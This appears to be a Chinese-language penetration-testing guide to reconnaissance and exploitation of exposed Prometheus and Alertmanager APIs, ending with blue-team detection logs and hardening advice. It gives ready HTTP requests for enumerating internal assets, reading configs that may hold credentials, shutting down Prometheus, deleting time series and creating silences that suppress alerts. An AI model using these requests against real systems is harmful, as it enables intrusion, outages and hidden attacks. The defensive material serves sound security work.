---
title: "Prometheus与Alertmanager监控面打点与接口利用技术"
weight: 52
---

# Prometheus与Alertmanager监控面打点与接口利用技术

`Prometheus` 与 `Alertmanager` 在云原生环境中几乎是默认存在的监控与告警基础设施。对攻击者来说，它们的价值从来不只是“看监控图表”，而在于这套系统本身往往保存了大量环境结构、目标资产、告警规则、标签体系和内部服务信息。一旦暴露到低信任网络，或者运维为了方便开启了生命周期接口、管理接口或未经鉴权的 Alertmanager API，攻击者就可以在打点阶段快速获得：

- 被监控主机与服务的清单
- 内部 IP、端口、作业名与标签体系
- Prometheus 配置中的抓取目标、认证信息和服务发现信息
- 管理接口是否允许 `reload`、`quit`、删除时间序列
- Alertmanager 中当前正在告警的业务与基础设施异常
- Silence、Inhibition、Routing 相关的策略线索

本文聚焦打点与利用侧，重点记录：

1. 如何识别 Prometheus 与 Alertmanager
2. 匿名或弱鉴权情况下，哪些接口最有价值
3. 如何通过查询、状态、Targets、Config、Series API 建立资产画像
4. 如何判断生命周期接口与管理接口是否可被利用
5. 蓝队如何从 Web/API 日志和组件日志中识别这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

首轮至少应枚举：

- `/graph`
- `/metrics`
- `/api/v1/status/buildinfo`
- `/api/v1/status/config`
- `/api/v1/status/flags`
- `/api/v1/targets`
- `/api/v1/labels`
- `/api/v1/series`
- `/api/v1/query`
- `/-/healthy`
- `/-/ready`
- `/-/reload`
- `/-/quit`
- `/api/v1/admin/tsdb/delete_series`
- `/api/v2/status`
- `/api/v2/alerts`
- `/api/v2/silences`
- `/api/v2/silence/<id>`

### 0.2 打点收益优先级

按“最快转成真实攻击价值”的顺序，常见收益可排列为：

1. 确认是否为 Prometheus / Alertmanager 与版本特征
2. 枚举 targets、labels、series 和 query 结果
3. 读取 `status/config` 与 `status/flags`
4. 判断 `/-/reload`、`/-/quit` 与 admin API 是否启用
5. 枚举 Alertmanager 中的 alerts、silences 与 routing 线索

---

## 1. 第一轮打点：确认 Prometheus 与 Alertmanager

### 1.1 Prometheus UI 与健康接口

#### 请求示例

```http
GET /graph HTTP/1.1
Host: prometheus.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

页面正文常见特征包括：

- `Prometheus Time Series Collection and Processing Server`
- `Expression`
- `Graph`

#### 请求示例

```http
GET /-/healthy HTTP/1.1
Host: prometheus.target.example
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8

Prometheus Server is Healthy.
```

这类健康接口本身虽然不敏感，但足以说明：

- 目标是 Prometheus
- Web 面在线
- 后续值得继续测 `/api/v1`

### 1.2 版本与构建信息

#### 请求示例

```http
GET /api/v1/status/buildinfo HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": {
    "version": "2.53.1",
    "revision": "c0ffee123456789",
    "branch": "HEAD",
    "buildUser": "root@builder",
    "goVersion": "go1.22.4"
  }
}
```

这条响应的价值包括：

- 明确版本范围
- 暴露构建信息
- 帮助判断后续应重点关注配置泄露、生命周期接口还是历史版本面

### 1.3 Alertmanager 识别

#### 请求示例

```http
GET /api/v2/status HTTP/1.1
Host: alertmanager.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "cluster": {
    "status": "ready",
    "name": "alertmanager-cluster"
  },
  "configYAML": "global:\n  resolve_timeout: 5m\nroute:\n  receiver: default\n",
  "uptime": "72h31m12.221s",
  "versionInfo": {
    "version": "0.27.0",
    "goVersion": "go1.22.2"
  }
}
```

如果匿名可拿到这类响应，意味着收益已经非常高：

- Alertmanager 版本可见
- 集群状态可见
- 某些环境中连 `configYAML` 都可直接读到

---

## 2. 第二轮打点：Prometheus 的目标、标签与序列枚举

### 2.1 `/api/v1/targets`：最直接的资产入口

JFrog 的公开研究明确指出，大量公开暴露的 Prometheus 会在 `/api/v1/targets` 中泄露目标地址和标签数据，这些信息足以被用来做环境画像与后续攻击路径推断。

#### 请求示例

```http
GET /api/v1/targets HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": {
    "activeTargets": [
      {
        "scrapeUrl": "http://10.10.20.11:9100/metrics",
        "labels": {
          "instance": "10.10.20.11:9100",
          "job": "node-exporter",
          "env": "prod",
          "region": "cn-east-1"
        },
        "health": "up"
      },
      {
        "scrapeUrl": "http://10.10.30.8:8080/actuator/prometheus",
        "labels": {
          "instance": "10.10.30.8:8080",
          "job": "payment-api"
        },
        "health": "up"
      }
    ]
  }
}
```

这条响应的打点价值极高，因为它会直接暴露：

- 内部 IP 与端口
- job 命名
- 环境标签
- 是否抓取 Spring Boot `/actuator/prometheus`

### 2.2 `/api/v1/labels`：标签模型枚举

#### 请求示例

```http
GET /api/v1/labels HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": [
    "__name__",
    "cluster",
    "container",
    "env",
    "instance",
    "job",
    "namespace",
    "pod",
    "service"
  ]
}
```

这一步的意义在于：

- 快速识别监控模型是宿主机、Kubernetes 还是混合环境
- 判断后续 series 和 query 应按哪些标签聚焦

### 2.3 `/api/v1/series`：低噪音资产还原

官方 HTTP API 文档明确给出了 `series` 的使用方式，这个接口比直接扫 `/metrics` 更适合结构化枚举。

#### 请求示例

```http
GET /api/v1/series?match[]=up HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": [
    {
      "__name__": "up",
      "instance": "10.10.20.11:9100",
      "job": "node-exporter"
    },
    {
      "__name__": "up",
      "instance": "10.10.30.8:8080",
      "job": "payment-api"
    }
  ]
}
```

这类响应几乎可以直接转成：

- 主机清单
- 服务清单
- 下一步要探测的内网端口和业务服务

### 2.4 `/api/v1/query`：查询即打点

Prometheus 的 `query` 接口不是“运维查询工具”而已，它本身就是打点放大器。

#### 请求示例

```http
GET /api/v1/query?query=up HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": {
    "resultType": "vector",
    "result": [
      {
        "metric": {
          "__name__": "up",
          "job": "prometheus",
          "instance": "localhost:9090"
        },
        "value": [1718228201.781, "1"]
      },
      {
        "metric": {
          "__name__": "up",
          "job": "payment-api",
          "instance": "10.10.30.8:8080"
        },
        "value": [1718228201.781, "1"]
      }
    ]
  }
}
```

对打点来说，最常见的高价值查询包括：

- `up`
- `label_values(up, job)`
- `count by(job) (up)`
- `kube_node_info`
- `kube_pod_info`

需要强调的是，查询本身就会留下清晰痕迹，尤其在反向代理日志和组件日志中很容易识别。

---

## 3. 第三轮打点：配置与标志位信息泄露

### 3.1 `/api/v1/status/config`

JFrog 的研究特别点出，这个接口经常会泄露抓取配置与 URL 中显式携带的用户名密码等敏感信息。

#### 请求示例

```http
GET /api/v1/status/config HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": {
    "yaml": "global:\n  scrape_interval: 15s\nscrape_configs:\n- job_name: payment-api\n  static_configs:\n  - targets: ['10.10.30.8:8080']\n- job_name: blackbox\n  metrics_path: /probe\n  params:\n    module: [http_2xx]\n  static_configs:\n  - targets:\n    - https://api.internal.local/health\n"
  }
}
```

在更差的环境里，可能直接看到：

- `basic_auth`
- `bearer_token`
- `authorization credentials in URL`
- service discovery 配置

这类响应通常应被视作高价值情报泄露。

### 3.2 `/api/v1/status/flags`

#### 请求示例

```http
GET /api/v1/status/flags HTTP/1.1
Host: prometheus.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "success",
  "data": {
    "web.enable-admin-api": "true",
    "web.enable-lifecycle": "true",
    "config.file": "/etc/prometheus/prometheus.yml",
    "storage.tsdb.path": "/prometheus"
  }
}
```

这条响应对攻击者尤其关键，因为它直接说明：

- 是否启用了 admin API
- 是否启用了 lifecycle API
- 配置文件路径与数据路径

如果 `web.enable-admin-api=true` 或 `web.enable-lifecycle=true`，后续就必须进入高优先级验证。

---

## 4. 第四轮打点：生命周期接口与管理接口

Prometheus 官方安全模型文档明确指出：

- `--web.enable-admin-api` 会开放 `/api/*/admin/` 下的管理功能
- `--web.enable-lifecycle` 会开放 `/-/reload` 与 `/-/quit`

这两类接口默认关闭，但在实际环境里经常被为了运维方便而开启。

### 4.1 `/-/reload`

#### 请求示例

```http
POST /-/reload HTTP/1.1
Host: prometheus.target.example
Connection: close
Content-Length: 0
```

#### 典型成功响应示例

```http
HTTP/1.1 200 OK
```

#### 典型失败响应示例

```http
HTTP/1.1 404 Not Found
```

或：

```http
HTTP/1.1 403 Forbidden
```

这里的打点价值不是“盲目 reload”，而是要确认：

- 生命周期接口是否存在
- 目标是否把本应关闭的管理接口对外暴露了

### 4.2 `/-/quit`

#### 请求示例

```http
POST /-/quit HTTP/1.1
Host: prometheus.target.example
Connection: close
Content-Length: 0
```

#### 典型成功响应示例

```http
HTTP/1.1 200 OK
```

如果这类接口对外可用，就已经不只是信息泄露，而是明确的可破坏性管理面暴露。

### 4.3 `delete_series`

#### 请求示例

```http
POST /api/v1/admin/tsdb/delete_series HTTP/1.1
Host: prometheus.target.example
Content-Type: application/x-www-form-urlencoded
Connection: close

match[]=up
```

#### 典型成功响应示例

```json
{
  "status": "success",
  "data": {}
}
```

如果命中这一类接口，就意味着：

- 管理面不只是可观察
- 还具备真实的破坏性操作能力

---

## 5. 第五轮打点：Alertmanager 的 alerts、silences 与状态接口

### 5.1 `/api/v2/alerts`

#### 请求示例

```http
GET /api/v2/alerts HTTP/1.1
Host: alertmanager.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "labels": {
      "alertname": "HighCPUUsage",
      "instance": "10.10.20.11:9100",
      "job": "node-exporter",
      "severity": "critical"
    },
    "status": {
      "state": "active",
      "silencedBy": [],
      "inhibitedBy": []
    },
    "annotations": {
      "summary": "Node CPU usage is too high"
    }
  }
]
```

这类响应的价值在于：

- 暴露当前异常服务与实例
- 直接给出业务或基础设施正在出问题的组件
- 暴露告警标签体系和严重级别模型

### 5.2 `/api/v2/silences`

#### 请求示例

```http
GET /api/v2/silences HTTP/1.1
Host: alertmanager.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "d29d9df3-9125-4441-912c-70b05f86f973",
    "status": {
      "state": "active"
    },
    "updatedAt": "2026-06-13T00:32:11.763Z",
    "createdBy": "ops-bot",
    "comment": "payment deployment maintenance window",
    "matchers": [
      {
        "name": "service",
        "value": "payment-gateway",
        "isRegex": false,
        "isEqual": true
      }
    ]
  }
]
```

这类响应在打点中的价值常被低估，但实际上它会直接暴露：

- 维护窗口
- 部署节奏
- 业务服务名
- 静默规则习惯

### 5.3 单个 Silence 查询

#### 请求示例

```http
GET /api/v2/silence/d29d9df3-9125-4441-912c-70b05f86f973 HTTP/1.1
Host: alertmanager.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "id": "d29d9df3-9125-4441-912c-70b05f86f973",
  "status": {
    "state": "active"
  },
  "comment": "payment deployment maintenance window",
  "startsAt": "2026-06-13T00:00:00Z",
  "endsAt": "2026-06-13T02:00:00Z",
  "createdBy": "ops-bot"
}
```

对攻击者来说，这一类对象能帮助判断：

- 什么时候业务处于维护窗口
- 什么时候告警可能被有意压制

### 5.4 创建 Silence 的打点判断

如果目标允许未授权或弱授权创建 silence，就已经从“观测面暴露”升级到“告警抑制面暴露”。

#### 请求示例

```http
POST /api/v2/silences HTTP/1.1
Host: alertmanager.target.example
Content-Type: application/json
Connection: close

{
  "matchers": [
    {
      "name": "job",
      "value": "payment-api",
      "isRegex": false,
      "isEqual": true
    }
  ],
  "startsAt": "2026-06-13T01:00:00Z",
  "endsAt": "2026-06-13T03:00:00Z",
  "createdBy": "security-test",
  "comment": "authorized test"
}
```

#### 典型成功响应示例

```json
{
  "silenceID": "a3f2b1c4-4d5e-6f7a-8b9c-0d1e2f3a4b5c"
}
```

这类成功响应说明问题已经非常严重，因为它意味着：

- 外部用户不只是看见了告警
- 还能够实质性改变告警行为

---

## 6. 打点流程建议

更稳的 Prometheus/Alertmanager 打点流程通常如下：

### 6.1 第一轮：识别与版本

优先请求：

- `/graph`
- `/-/healthy`
- `/api/v1/status/buildinfo`
- `/api/v2/status`

目标：

- 确认产品类型
- 获取版本和组件状态

### 6.2 第二轮：Targets 与标签体系

优先请求：

- `/api/v1/targets`
- `/api/v1/labels`
- `/api/v1/series?match[]=up`
- `/api/v1/query?query=up`

目标：

- 还原内网资产
- 识别 job / instance / env / cluster 体系

### 6.3 第三轮：配置与开关

优先请求：

- `/api/v1/status/config`
- `/api/v1/status/flags`

目标：

- 判断是否泄露 config
- 判断 lifecycle / admin API 是否启用

### 6.4 第四轮：高风险管理接口

优先请求：

- `/-/reload`
- `/-/quit`
- `/api/v1/admin/tsdb/delete_series`

目标：

- 判断是否存在对外暴露的破坏性面

### 6.5 第五轮：Alertmanager

优先请求：

- `/api/v2/alerts`
- `/api/v2/silences`
- `/api/v2/silence/<id>`

目标：

- 识别当前故障面
- 识别维护窗口与 silences
- 判断是否存在告警抑制能力暴露

---

## 7. 蓝队检测与处置

### 7.1 访问日志中的高价值信号

应重点识别：

- 对 `/api/v1/targets`、`/status/config`、`/status/flags` 的访问
- 对 `/-/reload`、`/-/quit`、`/api/v1/admin/` 的探测
- 对 `/api/v2/alerts`、`/api/v2/silences` 的枚举
- 短时间内对 labels / series / query 的连续调用

#### 日志示例

```text
10.10.10.21 - - [13/Jun/2026:01:41:11 +0800] "GET /api/v1/targets HTTP/1.1" 200 6112 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [13/Jun/2026:01:41:16 +0800] "GET /api/v1/status/config HTTP/1.1" 200 2344 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [13/Jun/2026:01:41:24 +0800] "POST /-/reload HTTP/1.1" 200 0 "-" "python-requests/2.32"
```

第三条通常应被视为高优先级事件。

### 7.2 组件日志中的调查点

Prometheus 和 Alertmanager 自身日志通常会留下：

- `reload triggered`
- `quit` / shutdown
- API query 请求
- silence 变更
- alert 状态变化

#### Prometheus 日志示例

```text
level=info ts=2026-06-13T01:41:24.011Z caller=main.go:1234 msg="Loading configuration file" filename=/etc/prometheus/prometheus.yml
```

#### Alertmanager 日志示例

```text
level=info ts=2026-06-13T01:42:10.441Z caller=api.go:312 component=web msg="created silence" silence=a3f2b1c4-4d5e-6f7a-8b9c-0d1e2f3a4b5c
```

如果组件日志与外层访问日志能对应上，通常可以非常快速地确认攻击阶段。

### 7.3 处置建议

发现这类打点后，应优先做：

1. 立即把 Prometheus / Alertmanager 从公网或低信任网络隔离
2. 禁止匿名访问核心 API
3. 检查 `status/config`、`status/flags` 是否已经暴露敏感信息
4. 关闭 `--web.enable-admin-api` 与 `--web.enable-lifecycle`，除非确有必要
5. 审计 Alertmanager 中是否存在异常 silence
6. 核查是否有敏感内部地址、凭据或服务发现信息已被泄露

长期建议：

- 不将 Prometheus HTTP 面默认暴露给不可信用户
- 对 Alertmanager API 启用认证与网络隔离
- 对 `reload`、`quit`、`delete_series` 等路径建立专门检测
- 定期审计 targets、config 与 alerts 中是否包含敏感数据

---

## 8. 复盘清单

### 8.1 红队侧

- 是否确认了版本、buildinfo 和 Alertmanager status
- 是否记录了 targets、labels、series 和 query 结果
- 是否确认了 config 与 flags 的暴露边界
- 是否验证了 lifecycle / admin API 的可用性
- 是否记录了 alerts、silences 与对应的业务线索

### 8.2 蓝队侧

- 是否能识别 Prometheus API 的批量枚举行为
- 是否能识别对 `/-/reload`、`/-/quit`、`delete_series` 的高危探测
- 是否能识别匿名读取 Alertmanager alerts 与 silences
- 是否能从组件日志还原 reload、silence 变更与 query 行为

### 8.3 应急侧

- 是否确认敏感配置和内部目标是否已泄露
- 是否确认是否发生过 reload、quit、delete_series 或 silence 注入
- 是否完成网络隔离和参数收敛
- 是否完成对当前告警抑制状态的复核

---

## 9. 总结

`Prometheus` 与 `Alertmanager` 的风险不只是“监控可见”，而是它们经常在同一套 API 面上同时暴露：

- 资产清单
- 标签模型
- 配置内容
- 管理开关
- 当前故障与告警状态

对打点来说，更值得沉淀的方法学是：

- 先识别版本与状态
- 再枚举 targets、labels、series、query
- 再确认 config 与 flags
- 最后验证 lifecycle、admin API 与 Alertmanager silences

这样才能把“监控面暴露”真正转化成结构化的攻击收益判断。

---

## 参考资料

- [Prometheus Security Model](https://prometheus.io/docs/operating/security/)
- [Prometheus HTTP API](https://prometheus.io/docs/prometheus/latest/querying/api/)
- [Alertmanager Overview](https://prometheus.io/docs/alerting/latest/alertmanager/)
- [JFrog: Don’t let Prometheus Steal your Fire](https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/)
- [The Hacker News: Experts Warn of Unprotected Prometheus Endpoints Exposing Sensitive Information](https://thehackernews.com/2021/10/experts-warn-of-unprotected-prometheus.html)
